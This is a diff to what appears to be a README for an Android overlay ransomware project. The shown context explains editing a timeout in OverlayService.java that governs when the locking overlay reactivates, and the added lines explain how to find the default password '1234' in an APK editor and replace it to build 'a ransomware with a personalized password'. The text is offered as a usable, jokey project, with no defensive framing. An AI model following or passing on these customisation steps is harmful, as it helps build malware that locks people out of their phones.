@@ -30,6 +30,12 @@ That was a good question, you install the apk editor.apk program that I gave you
 ```
 This number in the Java file called OverlayService.java at line 187 determines how many milliseconds your test phone has to uninstall the app after entering the password. The lower the number, the faster the app reactivates after the password is entered — it's totally up to you. If you can't figure it out in the app, or if you can't find this number by searching inside an APK editor, just open the project I've placed in Sketchware Pro. In the Java/Kotlin section, you can open the OverlayService.java file and increase or decrease the duration at line 187, then rebuild the project and get the APK output.
 
+By the way, to edit the ransomware password, search for the following word in the apk editor:
+```
+1234
+```
+And then enter your desired password, save and build, and now you have a ransomware with a personalized password.
+
 Note: The app also plays a funny Iranian song with SpongeBob's voice when it runs — I just put it there for the humor of it. Enjoy 😂
 
 And that's it, that was my project. I hope you like it.
